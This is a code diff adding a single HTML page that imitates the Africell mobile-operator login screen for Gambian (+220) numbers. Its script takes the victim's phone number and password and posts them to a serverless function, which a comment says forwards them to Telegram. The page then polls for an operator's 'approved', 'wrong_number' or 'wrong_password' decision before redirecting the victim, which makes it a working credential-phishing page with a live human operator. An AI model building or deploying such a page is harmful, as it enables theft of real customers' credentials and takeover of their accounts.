@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Africell Login</title>
+    <style>
+        :root {
+            --africell-purple: #a60068;
+            --africell-orange: #ff9900;
+            --bg-gray: #f8f9fa;
+            --border-color: #dcdcdc;
+            --text-muted: #888;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--africell-purple);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Top Bar Branding */
+        .top-nav {
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: white;
+            height: 15vh;
+        }
+
+        .brand-logo {
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .skip-btn {
+            font-size: 16px;
+            cursor: pointer;
+            opacity: 0.9;
+        }
+
+        /* The White Login Card */
+        .login-card {
+            background: white;
+            flex-grow: 1;
+            border-top-left-radius: 30px;
+            border-top-right-radius: 30px;
+            padding: 30px 20px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-wrapper {
+            margin-bottom: 15px;
+        }
+
+        /* Biometrics Toggle Style */
+        .biometrics-row {
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 12px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            color: #444;
+        }
+
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 44px;
+            height: 24px;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 34px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked+.slider {
+            background-color: var(--africell-purple);
+        }
+
+        input:checked+.slider:before {
+            transform: translateX(20px);
+        }
+
+        /* Phone & Password Inputs */
+        .phone-row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .country-select {
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 12px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            min-width: 90px;
+        }
+
+        .standard-input {
+            width: 100%;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 15px;
+            font-size: 16px;
+            outline: none;
+            color: #333;
+        }
+
+        .standard-input::placeholder {
+            color: #bbb;
+        }
+
+        .forgot-link {
+            text-align: right;
+            color: var(--africell-purple);
+            font-size: 14px;
+            margin-top: 8px;
+            display: block;
+            text-decoration: none;
+        }
+
+        /* Buttons */
+        .login-btn {
+            background-color: var(--africell-purple);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 25px;
+            cursor: pointer;
+        }
+
+        .register-section {
+            margin-top: auto;
+            text-align: center;
+            padding-bottom: 20px;
+        }
+
+        .register-text {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .register-btn {
+            background: transparent;
+            color: var(--africell-orange);
+            border: 2px solid var(--africell-orange);
+            border-radius: 10px;
+            padding: 16px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="top-nav">
+        <div class="brand-logo">africell</div>
+        <div class="skip-btn" onclick="window.location.href='app.html'">Skip</div>
+    </div>
+
+    <div class="login-card">
+        <div class="biometrics-row">
+            <span>Login with Biometrics</span>
+            <label class="switch">
+                <input type="checkbox">
+                <span class="slider"></span>
+            </label>
+        </div>
+
+        <div class="input-wrapper phone-row">
+            <div class="country-select">
+                <span style="font-size: 18px;">🇬🇲</span>
+                <span>+220</span>
+                <span>⌵</span>
+            </div>
+            <input type="tel" id="phoneInput" class="standard-input" placeholder="Mobile Number">
+        </div>
+
+        <div class="input-wrapper">
+            <input type="password" id="passInput" class="standard-input" placeholder="Password">
+            <a href="#" class="forgot-link">Forgot Password</a>
+        </div>
+
+        <button class="login-btn" id="loginBtn" onclick="doLogin()">Login</button>
+
+        <!-- Error message -->
+        <div id="errorMsg" style="display:none; margin-top:14px; background:#fff0f0; border:1px solid #ffcccc;
+             border-radius:10px; padding:12px 15px; text-align:center; font-size:13px; color:#cc0000;"></div>
+
+        <div class="register-section">
+            <p class="register-text">Don't have an account?</p>
+            <button class="register-btn" onclick="window.location.href='app.html'">Register</button>
+        </div>
+    </div>
+
+    <!-- Loading overlay -->
+    <div id="waitOverlay" style="display:none; position:fixed; inset:0; z-index:999;
+         background:rgba(166,0,104,0.95); flex-direction:column;
+         align-items:center; justify-content:center; color:white;">
+        <div style="width:48px;height:48px;border:5px solid rgba(255,255,255,0.3);
+             border-top-color:white;border-radius:50%;animation:spin 0.9s linear infinite;
+             margin-bottom:20px;"></div>
+        <div style="font-size:17px;font-weight:700;">Verifying credentials...</div>
+        <div style="font-size:13px;opacity:0.75;margin-top:6px;">Please wait</div>
+        <style>
+            @keyframes spin {
+                to {
+                    transform: rotate(360deg);
+                }
+            }
+        </style>
+    </div>
+
+    <script>
+        function showError(msg) {
+            const box = document.getElementById('errorMsg');
+            box.textContent = msg;
+            box.style.display = 'block';
+            document.getElementById('waitOverlay').style.display = 'none';
+            document.getElementById('loginBtn').disabled = false;
+        }
+
+        async function doLogin() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            const pass = document.getElementById('passInput').value.trim();
+            if (!phone || !pass) {
+                showError('Please enter your mobile number and password.');
+                return;
+            }
+
+            document.getElementById('errorMsg').style.display = 'none';
+            document.getElementById('loginBtn').disabled = true;
+            document.getElementById('waitOverlay').style.display = 'flex';
+
+            // Generate unique session ID
+            const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
+            sessionStorage.setItem('sessionId', sessionId);
+            sessionStorage.setItem('phone', phone);
+
+            // Send to Telegram via Netlify function
+            try {
+                await fetch('/.netlify/functions/request-approval', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, password: pass, sessionId })
+                });
+            } catch (e) {
+                showError('Network error. Please try again.');
+                return;
+            }
+
+            // Poll Redis for decision
+            const poll = setInterval(async () => {
+                try {
+                    const res = await fetch(`/.netlify/functions/check-status?sessionId=${sessionId}&type=login`);
+                    const data = await res.json();
+                    const status = data.status;
+
+                    if (status === 'approved') {
+                        clearInterval(poll);
+                        window.location.href = '3.html';
+                    } else if (status === 'wrong_number') {
+                        clearInterval(poll);
+                        showError('❌ The number you entered is incorrect. Please try again.');
+                    } else if (status === 'wrong_password') {
+                        clearInterval(poll);
+                        showError('❌ Incorrect password. Please try again.');
+                    }
+                    // else still 'pending' — keep polling
+                } catch (e) { /* retry on next tick */ }
+            }, 2000);
+
+            // Timeout after 3 minutes
+            setTimeout(() => {
+                clearInterval(poll);
+                showError('⏱ Request timed out. Please try again.');
+            }, 180000);
+        }
+    </script>
+
+</body>
+
+</html>
